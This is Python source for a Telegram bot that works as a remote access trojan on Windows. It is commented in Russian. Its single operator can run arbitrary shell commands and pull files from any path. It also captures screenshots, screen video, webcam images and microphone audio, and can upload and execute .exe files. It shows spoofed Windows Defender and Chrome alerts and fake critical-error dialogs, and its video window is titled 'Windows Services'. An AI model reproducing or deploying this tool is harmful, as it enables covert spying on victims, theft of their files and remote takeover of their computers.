import os
import telebot
import cv2
from telebot import *
from telebot.types import Message
from telebot.callback_data import CallbackData
import tempfile
from PIL import ImageGrab, Image, ImageTk
from tkinter import messagebox
import tkinter
import keyboard as k
import pyautogui as pg
import time
import numpy as np
import platform as p
import winreg
import random
import sys
import subprocess
import threading
import webbrowser
import wave
import psutil
import pyaudio
import pygame
import ctypes
from winotify import *
import pynput as pn
from pynput.keyboard import Key, Controller
from ffpyplayer.player import MediaPlayer
import mimetypes


API_TOKEN = 'your bot API from botfather token'


bot = telebot.TeleBot(API_TOKEN)
pygame.init()


#Уведомление о запуске скрипта
me = your telegram id
bot.send_message(me, 'Срипт запущен')


wait = {}

RICKROLL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1'
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024
RECORD_SECONDS = 5  
WAVE_OUTPUT_FILENAME = "mic_record.wav"
VNAME = 'video.mp4'


def brop(message:Message):
    ur = message.text
    webbrowser.open(ur, new=1)


def cmdcom(message:Message):
    com = message.text
    os.system(com)


def Erd(message:Message):
    Er = message.text
    keyboard = Controller()
    pg.hotkey('win', 'd')
    messagebox.showerror(title='Критическая ошибка', message=Er)


def writer():
    name = 'video.mp4'
    dur = 5

    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    fps = 25
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    out = cv2.VideoWriter(name, fourcc, fps, (width, height))

    strtime = int(time.time())

    while (int(time.time()) - strtime) < dur:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    cap.release()
    out.release()


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.chat.id 
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)  
    if user == your telegram id:
        files = "spravka.txt"
        patho = os.getcwd()
        path = os.path.join(patho, files)

        deac = types.KeyboardButton('Деактивация')
        fldwn = types.KeyboardButton('Выгрузка файлов')
        video = types.KeyboardButton('Показ видео')
        svrb = types.KeyboardButton('Свернуть окна')
        exe = types.KeyboardButton('Загрузить exe')
        data = types.KeyboardButton('Коммандная строка')
        eror = types.KeyboardButton('Системная ошибка')
        scr = types.KeyboardButton('Получить скриншот')
        oof = types.KeyboardButton('Выключить')
        clapp = types.KeyboardButton('Уведомление')
        rick = types.KeyboardButton('Рикрол')
        webc = types.KeyboardButton('Вебкамера(если есть)')
        sndup = types.KeyboardButton('Звук на максимум')
        snddn = types.KeyboardButton('Отключить звук')
        brows = types.KeyboardButton('Переход по ссылке')
        inf = types.KeyboardButton('Строка с возможностью вывода')
        plsnd = types.KeyboardButton('Проиграть звук')
        aubtn = types.KeyboardButton('Запись аудио')
        clsapp = types.KeyboardButton('Закрыть приложение')
        pht = types.KeyboardButton('Фото')
        vid = types.KeyboardButton('Видео')
        fld = types.KeyboardButton('Просмотр файлов')
        markup.add(exe)
        markup.add(video)
        markup.add(eror, data)
        markup.add(clapp, webc)
        markup.add(scr, oof)
        markup.add(sndup, snddn)
        markup.add(brows, plsnd)
        markup.add(aubtn, clsapp)
        markup.add(pht, svrb)
        markup.add(fld)
        markup.add(fldwn)
        markup.add(inf)
        markup.add(rick)
        markup.add(vid)
        markup.add(deac)
        bot.send_message(user, '''Готов к использованию!
Небольшая справка для использования будет отправлена в txt документе             ''', reply_markup=markup)
        #bot.send_message(user, "Небольшая справка для использования будет отправлена в txt документе")
        bot.send_document(user, open(path, 'rb'))
    else:
        bot.send_message(user, 'Доступ запрещён!')


@bot.message_handler(regexp='Показ видео')
def pokaz(message):
    user = message.chat.id
    if user == your telegram id:
        msg = bot.send_message(user, 'Отправьте видео')
        bot.register_next_step_handler(msg, pokazat)
    else:
        bot.send_message(user, 'Отказано в доступе!')


def pokazat(message):
    user = message.chat.id
    name = 'video.mp4'
    winn = 'Windows Services'
    
    vid = bot.get_file(message.video.file_id)
    dwnd = bot.download_file(vid.file_path)

    with open(name, 'wb') as f:
        f.write(dwnd)

    cap = cv2.VideoCapture(name)
    player = MediaPlayer(name)

    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    cv2.namedWindow(winn, cv2.WINDOW_AUTOSIZE)
    cv2.resizeWindow(winn, (width, height))
    cv2.setWindowProperty(winn, cv2.WND_PROP_TOPMOST, 1)

    try:
        if not cap.isOpened():
            raise FileNotFoundError('Файл не найден или поврежден')

        else:
            bot.send_message(user, 'Файл успешно открыт')
            while cap.isOpened():
                ret, img = cap.read()
                audiofrm, val = player.get_frame()
                fps = int(cap.get(cv2.CAP_PROP_FPS))

                if not ret:
                    bot.send_message(user, 'Видео завершилось или не открылось')
                    break

                cv2.imshow(winn, img)

                if cv2.waitKey(fps) & 0xFF == ord('q'):
                    break

    except Exception as e:
        bot.send_message(user, f'Произошла непредвиденая ошибка {e}')

    finally:
        cap.release()
        cv2.destroyAllWindows()
        time.sleep(2)
        if os.path.exists(name):
            try:
                time.sleep(2)
                os.remove(name)
            except Exception as e:
                bot.send_message(user, 'Файл занят системой')
        else:
            bot.send_message(user, "Файл удален либо не существует")
        

@bot.message_handler(regexp='Просмотр файлов')
def fed(message):
    user = message.chat.id
    if user == your telegram id:
        msg = bot.send_message(user, 'Введите стартовую папку(В формате путя например С:"\")')
        bot.register_next_step_handler(msg, finaly)
    else:
        bot.send_message(user, 'Доступ запрещен!')


def finaly(pathu):
    user = pathu.chat.id
    global fil
    fil = os.listdir(pathu.text)
    msg = bot.send_message(user, 'Напиши название файла или папки')
    bot.send_message(user, f"Выберите файл или папку")
    #for i in range(len(fil)):
    #    bot.send_message(user, fil[i])
    bot.register_next_step_handler(msg, finalyorg)
    
    
def finalyorg(pathn):
    user = pathn.chat.id
    filen = pathn.text
    folder = []
    if filen in fil:
        path = filen
        if os.path.isdir(path):
            finaly(pathn)
        else:
            with open(path, 'rb') as f:
                bot.send_document(user, f)
    else:
        bot.send_message(user, 'Файл не найден')
    #for x in range(len(fil)):
    #    path = os.path.join(fil[x], pathn.text)
    #    if os.path.isdir(path):
    #        folder.append(path)
    #        finaly(pathn.text)
    #    else:
    #        print(path)
    #        print(folder)
    #        bot.send_message(user, open(path, 'rb+'))


@bot.message_handler(regexp='Выгрузка файлов')
def sndf(message):
    user = message.chat.id
    if user == your telegram id:
        msg = bot.send_message(user, 'Введи путь')
        bot.register_next_step_handler(msg, sndfl)
    else:
        bot.send_message(user, 'Отказано в доступе!')


def sndfl(message):
    path = message.text
    user = message.chat.id
    if user == your telegram id:
        bot.send_document(user, open(path, 'rb'), caption='Вот файл по пути')
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Рикрол')
def rickastr(message):
    user = message.chat.id
    if user == your telegram id:
        rickrol = types.InlineKeyboardButton('cmd', callback_data='cmdsh')
        clr = types.InlineKeyboardButton('color 2', callback_data='dir')
        yt = types.InlineKeyboardButton('Ютуб', callback_data = 'yout')
        mark = types.InlineKeyboardMarkup(row_width=1)
        mark.add(rickrol, clr, yt)
        bot.send_message(user, 'Выбирай!', reply_markup=mark)
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.callback_query_handler(func=lambda call: call.data == 'cmd' or 'clr' or 'yout')
def rik(call):
    user = call.message.chat.id
    if user == your telegram id:
        if call.data == 'cmdsh':
            os.system('start cmd /k curl ascii.live /rick')
        elif call.data == 'dir':
            com = "color 2 && dir /s"
            pg.hotkey(['win', 'd'])
            subprocess.Popen(['cmd', '/k', com], creationflags=subprocess.CREATE_NEW_CONSOLE)
        else:
            webbrowser.open(RICKROLL, 1)
    else:
        bot.send_message(user, 'Доступ запрещён!')


@bot.message_handler(regexp='Выключить')
def coff(message):
    user = message.chat.id 
    if user == your telegram id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        hyb = types.InlineKeyboardButton('Гибернация', callback_data='hyb')
        off = types.InlineKeyboardButton('Выключение', callback_data='off')
        markup.add(hyb, off)
        bot.send_message(user, 'Пожалуйста выбирите вариант', reply_markup=markup)
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Строка с возможностью вывода')
def syzinf(message):
    user = message.chat.id
    if user == your telegram id:
        msg = bot.send_message(user, 'Введите batch команду для сбора информации например ipconfig')
        bot.register_next_step_handler(msg, systeminf)
    else:
        bot.send_message(user, 'Доступ запрещен!')


def systeminf(message):
    user = message.chat.id
    if user == your telegram id:
        try:
            command = str(message.text)
            res = subprocess.check_output(
                command,
                text=True,
                shell=True,
                timeout=10,
                encoding='cp866'
            )
            bot.send_message(user, f'Результат: {res}')
            
        except Exception as e:
            bot.send_message(user, f'Произошла ошибка: {e}')
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.callback_query_handler(func = lambda call: call.data == 'off')
def comoff(call):
    user = call.message.chat.id
    if user == your telegram id:
        bot.send_message(user, 'Выключаю...')
        os.system("shutdown -s -t 0")


@bot.callback_query_handler(func = lambda call: call.data == 'hyb')
def hyberfil(call):
    user = call.message.chat.id
    if user == your telegram id:
        bot.send_message(user, 'Выключаю в режиме гибернации')
        os.system("shutdown -h")


@bot.message_handler(regexp='Скриншот')
def scr(message):
    user = message.chat.id 
    if user == your telegram id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        vid = types.InlineKeyboardButton('Видео', callback_data='vid')
        scrn = types.InlineKeyboardButton('Скриншот', callback_data='scr')
        markup.add(vid, scrn)
        bot.send_message(user, 'Пожалуйста, выбирите что вам надо', reply_markup=markup)
        #path = tempfile.gettempdir() + 'screenshot.png'
        #screenshot = ImageGrab.grab()
        #screenshot.save(path, 'PNG')
        #bot.send_photo(user, open(path, 'rb'))
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.callback_query_handler(func=lambda call: call.data == 'vid')
def videozap(call):
        user = call.message.chat.id
        if user == your telegram id:
            frames = []
            rec = 'record.mp4'
            rectm = 5

            screen = tuple(pg.size())
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')

            start = time.time()

            while (time.time() - start) < rectm:
                img = pg.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                frames.append(frame)

            fps = 20

            cap = cv2.VideoWriter(rec, fourcc, fps, screen)
            
            for f in frames:    
                cap.write(f)

            cap.release()

            try:
                with open(rec, 'rb') as vid:
                    bot.send_video(user, vid, caption=f'Запись экрана в течении {rectm} секунд')

            except Exception as e:
                bot.send_message(user, f'Произошла ошибка при отправке: {e}')

            os.remove(rec)
            thrd = threading.Thread(target=videozap, args=(call,))
            thrd.start()
        else:
            bot.send_message(user, 'Отказано в доступе!')


@bot.callback_query_handler(func=lambda call: call.data == 'scr')
def screenshot(call):
    user = call.message.chat.id 
    if user == your telegram id:
        path = tempfile.gettempdir() + 'screenshot.png'
        screenshot = ImageGrab.grab()
        screenshot.save(path, 'PNG')
        bot.send_photo(user, open(path, 'rb'))
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Системная ошибка')
def Syserror(message):
    user = message.chat.id 
    if user == your telegram id:
        #bot.send_message(user, 'Введите название ошибки')
        #Ern = message.text
        bot.send_message(user, 'Введи текст ошибки')
        bot.register_next_step_handler(message, Erd)
        #Er = message.text
        #messagebox.showerror(title='Критическая ошибка', message=Er)
    else:
        bot.send_message(user, 'Отказано в доступе!')

@bot.message_handler(regexp='Видео')
def webcam(message):
    user = message.chat.id
    if user == your telegram id:
        name = 'video.mp4'
        dur = 5

        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        fps = 25
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

        out = cv2.VideoWriter(name, fourcc, fps, (width, height))

        strtime = int(time.time())

        while (int(time.time()) - strtime) < dur:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

        cap.release()
        out.release()

        bot.send_video(user, open(name, 'rb'), caption='Вот ваша запись')
    else:
        bot.send_message(user, 'Отказано в доступе!')

@bot.message_handler(regexp='Вебкамера')
def webca(message):
    user = message.chat.id
    if user == your telegram id:
        try:
            cap = cv2.VideoCapture(0)   
            ret, frame = cap.read()
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
                temp_path = temp_file.name
            cv2.imwrite(temp_path, frame)
            bot.send_photo(user, open(temp_path, 'rb'))
            cap.release()
        except Exception as e:
            bot.send_message(user, f'произошла ошибка: /n{e}')
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Уведомление')
def notifaer(message):
    user = message.chat.id
    if user == your telegram id:
        ink = types.InlineKeyboardMarkup(row_width=1)
        anv = types.InlineKeyboardButton(text = 'Windows Defender', callback_data= 'defen')
        chr = types.InlineKeyboardButton(text = 'Google Chrome', callback_data = 'google')
        ink.add(anv, chr)
        bot.send_message(user, text="Выбирете приложение", reply_markup=ink)
    else:
        bot.send_message(user, 'Отказано в доступе!')


# фунция nof связана с функицей notifaer по срдествам inline кнопок
@bot.callback_query_handler(func=lambda call: call.data == 'defen')
def nof(call):
    user = call.message.chat.id
    if user == your telegram id:
        ic = str(os.getcwd())
        ic = ic + '\\windef.png'
        toast = Notification(
            app_id = 'Windows Defender',
            title = 'Сводка защитника',
            msg = 'Обнаружена угроза!',
            duration = 'short',
            icon = ic
        )
        toast.set_audio(audio.LoopingCall10, loop=True)
        toast.add_actions(label='Посмотреть сводку')
        toast.show()
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.callback_query_handler(func=lambda call: call.data == 'google')
def gog(call):
    user = call.message.chat.id
    if user == your telegram id:
        fold = str(os.getcwd())
        fold = fold + '\\Google.png'
        toast1 = Notification(
            app_id = 'Google Chrome',
            title = 'Андрей Аллахов',
            msg = 'Известного российского тележурналиста и шоумена нашли живым в своей квартире, продолжение очень жестокое...',
            duration = 'short',
            icon = fold
        )
        toast1.set_audio(audio.LoopingAlarm, loop=True)
        toast1.show()
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Отключить звук')
def volof(message):
    user = message.chat.id
    if user == your telegram id:
        snd = Controller()
        for i in range(100):
            snd.press(Key.media_volume_down)
            snd.release(Key.media_volume_down)
            
    else:
        bot.send_message(user, 'Отказано в доступе!')
    

@bot.message_handler(regexp='Звук на максимум')
def volumeof(message):
    user = message.chat.id
    if user == your telegram id:
        snd = Controller()
        for i in range(100):
            snd.press(Key.media_volume_up)
            snd.release(Key.media_volume_up)
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Переход по ссылке')
def brow(message):
    user = message.chat.id
    if user == your telegram id:
        bot.send_message(user, 'Введите URL')
        bot.register_next_step_handler(message, brop)
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(regexp='Коммандная строка')
def sysinf(message):
    user = message.chat.id
    if user == your telegram id:   
        bot.send_message(user, "Введите комманду!")
        bot.register_next_step_handler(message, cmdcom)
    else:
        bot.send_message('Отказано в доступе!')


@bot.message_handler(regexp='Проиграть звук')
def mp(message):
    user = message.chat.id
    if user == your telegram id:
        #markup = types.InlineKeyboardMarkup(row_width=1)
        #mpt = types.InlineKeyboardButton(text = 'музыка(Mp3)', callback_data = 'mpthree')
        #gls = types.InlineKeyboardButton(text = 'Голосовое сообщение', callback_data = 'voice')
        #markup.add(mpt, gls)
        msg = bot.send_message(user, "Ожидаю файл")
        bot.register_next_step_handler(msg, play_sound)
    else:
        bot.send_message(user, "Отказано в доступе")


#@bot.callback_query_handler(lambda call: True)
#def hand_snd(call):
#    user = call.message.chat.id
#    if user == your telegram id:
#        if call.data == 'mpthree':
#            msgmp = bot.send_message(user, 'Ожидаю файл')
#            bot.register_next_step_handler(msgmp, play_sound)


#def voic(message):
#    user = message.chat.id
#    if id == your telegram id:
#        if message.content_type != 'voice':
#            bot.reply_to(message, "Отправьте голосовое сообщение")
#            return
#        try:
#            if pygame.mixer.music.get_busy():
#                pygame.mixer.music.stop()
#
#            pygame.mixer.music.unload()
#
#            file_id = bot.get_file(message.voice.file_id)
#            downloadet_file = bot.download_file(file_id.file_path)
#
#            name = 'voice.ogg'
#            with open(name, 'wb') as new_file:
#                new_file.write(downloadet_file)
#
#            pygame.mixer.music.init()
#            pygame.mixer.music.load(name)
#            pygame.mixer.music.play()
#
#        except Exception as e:
#            bot.send_message(user, f'Произошла ошибка: {e}')
#        
#    else:
#        bot.send_message(user, 'Отказано в доступе!')

def play_sound(message):
    user = message.chat.id
    if user == your telegram id:
        if message.content_type != 'audio':
            bot.reply_to(message, 'Это не аудио')
            return

        try:
            if pygame.mixer.music.get_busy():
                pygame.mixer.music.stop()

            pygame.mixer.music.unload()

            file_info = bot.get_file(message.audio.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            snd = 'sound.mp3'
            with open(snd, 'wb') as new_file:
                new_file.write(downloaded_file)

            pygame.mixer.init()
            pygame.mixer.music.load(snd)
            pygame.mixer.music.play()

            os.remove(snd)

        except Exception as e:
            bot.send_message(user, f'Произошла ошибка: /n{e}')

    else:
        bot.send_message(message.chat.id, 'Отказано в доступе!')


@bot.message_handler(commands=['stop'])
def stpsnd(message):
    user = message.chat.id
    if user == your telegram id:
        pygame.mixer.stop()
        bot.send_message(user, 'Остановлено')
    else:
        bot.send_message(user, 'Отказано в доступе!')

@bot.message_handler(regexp='Закрыть приложение')
def clap(message):
    user = message.chat.id
    if user == your telegram id:
        pg.hotkey('alt', 'f4')
        bot.send_message(user, 'Выполнено')
    else:
        bot.send_message(user, 'Откакзано в доступе')


@bot.message_handler(regexp='Запись аудио')
def write_audio(message):
    user = message.chat.id
    if user == your telegram id:
        bot.send_message(user, "Запись пошла")

        audio = pyaudio.PyAudio()

        try:
        
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                                rate=RATE, input=True,
                                frames_per_buffer=CHUNK)
            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)


            stream.stop_stream()
            stream.close()
            audio.terminate()


            with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))


            with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
                bot.send_voice(user, audio_file, caption="Вот ваша запись")


            os.remove(WAVE_OUTPUT_FILENAME)

        except Exception as e:
            bot.reply_to(message, f" Ошибка записи: /n{e}")

    else:
        bot.send_message(message.chat.id, 'Отказано в доступе!')


@bot.message_handler(regexp='Фото')
def ver_photo(message):
    user = message.chat.id
    if user == your telegram id:
        wait[user] = True
        bot.send_message(user, 'Отправь картинку')
    else:
        bot.send_message(user, 'Отказано в доступе!')


@bot.message_handler(content_types='photo')
def photo(message):
    user = your telegram id
    if user == your telegram id:
        if wait.get(user):
            try:
                file_info = bot.get_file(message.photo[-1].file_id)
                d_file = bot.download_file(file_info.file_path)

                name = 'photo.jpg'
                with open(name, 'wb') as f:
                    f.write(d_file)

                #img = cv2.imread('photo.jpg')
                #cv2.imshow('Photo From Telegram', img)

                #win = tkinter.Toplevel(root)
                win = tkinter.Tk()
                img = Image.open(name)
                pht = ImageTk.PhotoImage(img)

                win.image = pht 

                k.add_hotkey('q', win.destroy)

                win.attributes('-topmost', True)
                win.overrideredirect(1)
                win.attributes('-fullscreen', False)

                lab = tkinter.Label(win, image=pht)
                lab.pack()

                pg.hotkey('win', 'd')

                thrd = threading.Thread(target=photo, args=(name,))
                thrd.start()

                win.mainloop()

                bot.reply_to(message, 'Послание было закрыто')
                if os.path.exists(name):
                    os.remove(name)
                wait[user] = False

            except Exception as e:
                bot.send_message(user, f'Произошла ошибка {e}')
    else:
        bot.send_message(user, 'Отказано в доступе')


@bot.message_handler(regexp='Свернуть окна')
def svr(message):
    user = message.chat.id
    if user == your telegram id:
        pg.hotkey('win', 'd')
    else:
        bot.send_message(user, 'Отказано в доступе')


@bot.message_handler(regexp='Загрузить exe')
def exeh(message):
    user = message.chat.id
    if user == your telegram id:
        msg = bot.reply_to(message, 'Отправь exe файл')
        bot.register_next_step_handler(msg, exe)
    else:
        bot.send_message(user, 'Отказано в доступе!')


def exe(message):
    user = message.chat.id
    if user == your telegram id:
        inf = bot.get_file(message.document.file_id)
        dwnd = bot.download_file(inf.file_path)
        new_file = 'app.exe'

        with open(new_file, 'wb') as file:
            file.write(dwnd)


        thread = threading.Thread(target=exe, args=(new_file,))
        thread.start()

        pathn = os.getcwd()
        path = pathn + "\\" + new_file
        pth = r"C:\Users\STAS\Desktop\GIthub"
        
        process = subprocess.Popen(
            [os.path.join(pathn, new_file)]
            #cwd=pth
        )
        process.wait()

        time.sleep(2)

        bot.send_message(user, 'Процесс завершен!')

        os.remove(new_file)
    else:
        bot.send_message(user, 'Отказано в доступе!')


bot.infinity_polling(none_stop = True) #none_stop = True
#5035977103 айди ярика надо добавить